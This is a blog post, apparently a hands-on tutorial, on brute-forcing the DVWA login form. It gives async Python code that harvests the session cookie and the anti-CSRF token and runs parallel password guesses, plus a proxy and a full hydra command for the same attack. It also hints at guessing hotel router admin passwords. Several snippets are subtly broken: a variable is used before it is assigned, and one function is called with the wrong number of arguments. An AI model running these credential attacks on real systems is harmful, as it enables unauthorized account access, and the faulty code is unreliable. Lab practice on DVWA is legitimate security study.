+++
title = "Brutforce http on dvwa example"
description = "Some fun with efectiveness of brutforsing http forms"
date = 2024-01-20


[extra]
toc = true

[taxonomies]
tags = ["http", "async", "python", "appsec"]
categories = ["Technical"] 
+++

Generally, brute-forcing is not an effective method of penetration. However, in many cases, people do not really care about the strong protection of things they do not consider sensitive or important, such as WiFi passwords or router admin page credentials. Additionally, people often use simple passwords for frequently accessed accounts, such as mobile unlock passwords or notebook/PC user passwords.

In these cases, brute-forcing becomes a realistic approach to gaining access to the system, especially if the system lacks additional protections like rate limits.

<!-- more -->

I personally encountered a common situation where cheap hotel WiFi routers perform poorly, even with a limited number of connected clients. This is typically due to their low-quality software, which is not designed to operate for extended periods without rebooting and continuously registering numerous clients. In my experience, simply rebooting the router resolves the issue.

Usually, passwords on router admin pages are set to default values like "admin/admin" or common standard passwords. In many cases, the admin password is the same as the WiFi hotspot password, while in others, it might be "admin1," "password," "1111," or other frequently used combinations. Although guessing them manually may not be easy, even small password lists usually contain these common combinations.

I was playing a bit with brute-forcing such forms and want to share some of my experience.
I'll use the DVWA login page for brute-forcing for several reasons:

- It is rather simple, so we can use HTTP-only communication without involving a browser, Selenium, CDP, etc.
- It contains basic protection (anti-CSRF token) that makes it a bit closer to real-life examples.
- It is easy to spawn with Docker.

## Anti-CSRF tocken

When you visit the main page of dvwa, the response contains Set-cookie `PHPSESSID`.
It is generated uniq and identify you as a client. Futher when you will be autorized, your autorized session session will be identified by this cookie.

And there is one more token interesting thing that is not listed in headeers. Pay attantion at the login page form:

```html
<form action="login.php" method="post">
  <fieldset>
    <label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
    <label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
    <br />
    <p class="submit"><input type="submit" value="Login" name="Login"></p>
  </fieldset>
  <input type='hidden' name='user_token' value='f2d9e02f055bfb41947082e86df2dbfb' />
</form>
```

There is no visible addition input - `hidden`, with random value every new time you load the page.
Server knows what token was dedicated to what paticular PHPSESSID.
So in case if wrong token will be used , login won't be succesful eve with valid credentials.

With this protection in place, an attacker who tries to perform CSRF using a malicious site cannot fake HTTP requests without knowing the current token set in the valid user’s cookie  PHPSESSID. Because your server rejects all requests without this token, any attack attempts will fail.
More info on <https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/>, <https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/>

There fore to start brutforsing, we have to get `PHPSESSID` and `user_token`.

So HTTP get of the login page give use this infor in set-cookies and response body. HTMP parsing is not mandatory - we can d it with regexp.

```python
async def get_phpssid_and_user_token(login_page_url, session):
  async with session.get(login_page_url, allow_redirects = False) as response:
    headers = response.headers
    set_cookie = headers.get('Set-Cookie')
    # PHPSESSID=sonlldpq6ikpmqnpq5lh6rbvn6; path=/'
    phpsessid = re.search("PHPSESSID=(.+?);", set_cookie).group(1)
    content = await response.text()
    # <input type='hidden' name='user_token' value='516a2d3820eda4873109988ec5ff167c' />
    user_token = re.search("name='user_token' value='(.+?)'", content).group(1)
    logging.debug(f"get_phpssid_and_user_token done phpsessid: {phpsessid}, user_token: {user_token}")
    return phpsessid, user_token
```

I am not processing possible error is this examples to make them short.
In real case it you always sould do it.

## Login function

For brute-forcing, we need a boolean function that returns true if the login was successful and false otherwise. The unsuccessful login signal for DVWA is a redirection to `login.php`, while a redirection to `index.php` indicates a successful login.

Here is a login page with async aiohttp in python.

```python
async def login(login_page_url, user, password, user_token, phpsessid):
  data = {
        'username': user,
        'password': password,
        'Login': 'Login',
        'user_token': user_token
  }
  async with aiohttp.ClientSession() as session:
    async with session.post(login_page_url, allow_redirects = False, headers=headers, data=data) as response:
      headers = {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Cookie': f'PHPSESSID={phpsessid}; security=low',
      }
      location = headers.get('Location')
      if location == "index.php":
        return True
      return False
```

## Parallel brutforce

Even on localhost sequential HTTP request-response is dramaticaly not efficient. We can do it in parallel with `aiohttp`.

All login requests will be started in parallel but not in threads, async approach will allocate exection time for jobs while other jobs are waiting for IO(http response).

It is required to stop brutforsing when login was succesful, so I can't just post all hjobs and whait fo all of them are done.

Each job should report about it's in some kind of shared storage the results of its login attempt.

```python
async def attack(usernames, passwords, phpsessid, user_token):
  queue = asyncio.Queue()
  tasks = []
  for username in usernames:
      for password in passwords:
        task = asyncio.create_task(login_task(queue, username, password, user_token, phpsessid))
        tasks.append(task)
  logging.info(f"attack started tasks: {len(tasks)}")
  received_count = 0
  pbar = tqdm.tqdm(total=len(tasks))
  while received_count < len(tasks):
    res = await queue.get()
    if res["login"]:
      return res
    received_count += 1
    pbar.update(1)
  for task in tasks:
    task.cancel()
```

While the login task is just calling login funtion and put a result in queue.

```python
async def login_task(queue, login_page_url, user, password, user_token, phpsessid):
  result = {"username" : user,
            "password" : password,
            "login" : await login(login_page_url, user, password, user_token, phpsessid)
            }
  await queue.put(result)
```

Link to full attack script: 

## Mature approach - hydra

Writing own britforsing script gives a lot of flexibility, but it is not easy to make it robust and most efficient. 
Bunch of problems that you should think about, especially when you is working with big password/usernames list and real targets, but not just localhost. 
At least:

- Connection reuse to avoid setting up new TCP conneciton every time you perform a request. 
- Do not spawn hundred thouthends of async jobs in case of working with big password lists that won't be efficient.
- Work with some paticular parallel requests to avoid target overloading and therefore not stable responses.

For sure there is ready to use brutforsing util - [hydra](https://github.com/vanhauser-thc/thc-hydra)

With a power of nix pakage manager I can get shell wiuth hydra available just like this :

```bash
 nix-shell -p thc-hydra
```

That is why I love NixOS and nix package manager (available even on MacOS even for M1). 

Hydra is very powerful tool, but handling anticsrf tocken and sessionid would not be easy, and require some preliminary preparation (manually get session id and tocken and pass it as parameters to hydra).

One more thing that hydra is not doing really good - complicsted machers for succesful and unsuccessful login. In dvwa case it it not a response code and not text in body - it is a `Location` header value.

To make hydra work with dvwa login, I choose to create some kind like a proxy server that would take user/login parameters on input, perform login and then response with login done in case of succesful login, and login failed in case of unsuccessful login. Such triggers can be natively parsed by `http-get-form` hydra module. Also this proxy server would handle all session_id and token staff.

`get_phpssid_and_user_token` funciton is already implemented. Same as `dvwa_login`.

Login handler would looks like:

```python
async def login_handler(request):
    try:
        user = request.query.get('u')
        password = request.query.get('p')
        login_success = await dvwa_login(user, password)
        if login_success:
            return web.Response(text="login done",status=200)
        else:
            return web.Response(text="login failed", status=200)
    except Exception as e:
        return web.Response(text="login failed",status=200)

app = web.Application()
app.router.add_route('*', '/login', login_handler)
web.run_app(app, port=8080)

```

Anh hydra command run would look like this:

```bash
time hydra \
  -L users.txt \
  -P passwords.txt \
  -s 8080 \
  -t 64 \
  localhost \
  http-get-form "/login:u=^USER^&p=^PASS^:G=:failed"
```

Here :

- `time` - for measuring how muych time it takes to attack the target
- `-L users.txt` - specify user list
- `-P passwords.txt` specify passwords list
- `-s 8080` - setup port of the target (in pur case a login proxy server)
- `-t 64` amount of parallels connections (64 is max, that is confusing)
- `localhost` - adress of login proxy server
- `http-get-form` - module to use
- `"/login:u=^USER^&p=^PASS^:G=:failed"` - description of request and parsing th response :
  - `/login` - endpoint with `u` and `p` query params
  - `^USER` - placeholder for username
  - `^PASS` - placeholder for password
  - `:G=` - `:` delimeter and setting to skip pre-request for set-cookie colleciton
  - `:failed` - failed login body matcher

## Measure requests per second

For userss and passwords for example you can use top 100 passwords from https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt 

and user names from https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt

Hydra reports the number of requests per minut that it is doing.
As soon as admin is on the second position in the susernames-shoort list it find it to fast. To see the bandwith I have put the admin a bit lower.
With hydra separate on on machine and dvwa one another accesible with tailscale and 64 threads i have following numbers:

```
[STATUS] 1216.00 tries/min, 1216 tries in 00:01h, 501 to do in 00:01h, 64 active
```

